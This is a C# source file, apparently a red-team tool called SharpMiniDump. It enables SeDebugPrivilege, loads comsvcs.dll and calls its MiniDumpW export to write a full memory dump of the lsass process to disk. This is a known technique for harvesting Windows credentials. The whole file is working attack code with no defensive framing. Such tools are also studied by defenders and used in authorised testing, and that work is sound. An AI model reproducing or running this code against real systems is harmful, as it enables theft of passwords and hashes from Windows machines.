using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace SharpMiniDump {

	/*
	 * 
	 * C# Port of MiniDumpW from @fgsec
	 * 
	 */

	public class Pinvoke {

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool PrivilegeCheck(IntPtr ClientToken, ref PRIVILEGE_SET RequiredPrivileges, out bool pfResult);

		[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref PTOKEN_PRIVILEGES newst, int len, IntPtr prev, IntPtr relen);

		[DllImport("kernel32.dll", ExactSpelling = true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct PTOKEN_PRIVILEGES {
			public int Count;
			public long Luid;
			public int Attr;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct PRIVILEGE_SET {
			public uint PrivilegeCount;
			public uint Control;
			public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public LUID_AND_ATTRIBUTES[] Privilege;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct LUID_AND_ATTRIBUTES {
			public long Luid;
			public UInt32 Attributes;
			public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
			public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
			public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;
			public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;
		}


		public static int SE_PRIVILEGE_DISABLED = 0x00000000;
		public static int SE_PRIVILEGE_ENABLED = 0x00000002;
		public static int TOKEN_QUERY = 0x00000008;
		public static int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
		public static int TOKEN_DUPLICATE = 0x00000002;
		public static int TOKEN_IMPERSONATE = 0x00000004;
		public static int TOKEN_ASSIGN_PRIMARY = 0x00000001;
		public static int TOKEN_ADJUST_SESSIONID = (0x0100);
		public static int TOKEN_ADJUST_DEFAULT = (0x0080);

	}

	class Program {
		public static bool AdjustTokenPrivilege(string priv) {
			try {
				Pinvoke.PTOKEN_PRIVILEGES tPriv;
				IntPtr hProc = Pinvoke.GetCurrentProcess();
				IntPtr tHandle = IntPtr.Zero;
				if (Pinvoke.OpenProcessToken(hProc, Pinvoke.TOKEN_ADJUST_PRIVILEGES | Pinvoke.TOKEN_QUERY, ref tHandle)) {
					tPriv.Count = 1;
					tPriv.Luid = 0;
					tPriv.Attr = Pinvoke.SE_PRIVILEGE_ENABLED;
					Pinvoke.LookupPrivilegeValue(null, priv, ref tPriv.Luid);
					Pinvoke.PRIVILEGE_SET privs = new Pinvoke.PRIVILEGE_SET { Privilege = new Pinvoke.LUID_AND_ATTRIBUTES[1], Control = Pinvoke.PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
					privs.Privilege[0].Luid = tPriv.Luid;
					privs.Privilege[0].Attributes = Pinvoke.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
					bool privCheck;
					Pinvoke.PrivilegeCheck(tHandle, ref privs, out privCheck);
					if (!privCheck) {
						Console.WriteLine("[*] Trying to adjust token for privilege '{0}'!", priv);
						if (Pinvoke.AdjustTokenPrivileges(tHandle, false, ref tPriv, 0, IntPtr.Zero, IntPtr.Zero)) {
							Console.WriteLine("[+] Success adjusting privilege to '{0}'!", priv);
							return true;
						}
					} else {
						Console.WriteLine("[+] Process token already have '{0}'!", priv);
						return true;
					}
				}
			} catch (Exception ex) {
				throw ex;
			}
			Console.WriteLine("[-] Error adjusting privilege {0}", Marshal.GetLastWin32Error());
			return false;
		}

		[UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
		unsafe public delegate UInt32 MiniDumpW_f(UInt32 x, UInt32 y, IntPtr command);

		public static void Main(string[] args) {

			AdjustTokenPrivilege("SeDebugPrivilege");

			string dumpPath = String.Format(@"{0}dump.xpto", AppDomain.CurrentDomain.BaseDirectory);
			if(args.Length > 0 && args[0].Length > 0) {
				dumpPath = args[0];
			}

			IntPtr csvcsLib = Pinvoke.LoadLibrary("comsvcs.dll");

			if(csvcsLib != IntPtr.Zero) {
				Console.WriteLine("[+] Got handler for comsvcs.dll ({0})", csvcsLib);
				IntPtr mdModel = Pinvoke.GetProcAddress(csvcsLib, "MiniDumpW");
				if (mdModel != IntPtr.Zero) {
					Console.WriteLine("[+] Got handler for MiniDumpW ({0})", mdModel);

					Process lsass = Process.GetProcessesByName("lsass")[0];
					string command = String.Format("{0} {1} {2}", lsass.Id, dumpPath, "full");
					
					MiniDumpW_f MiniDumpW = (MiniDumpW_f)Marshal.GetDelegateForFunctionPointer<MiniDumpW_f>(mdModel);
					UInt32 result = MiniDumpW(0, 0, Marshal.StringToHGlobalUni(command));

					if(File.Exists(dumpPath)) {
						Console.WriteLine("[+] Sucess - ({0})", dumpPath);
					} else {
						int error = Marshal.GetLastWin32Error();
						Console.WriteLine(String.Format("[+] Error Win32:{0} - MiniDumpW:{1}", error, result));
					}
					
				}
			}

			Console.ReadKey();
			
		}
	}
}
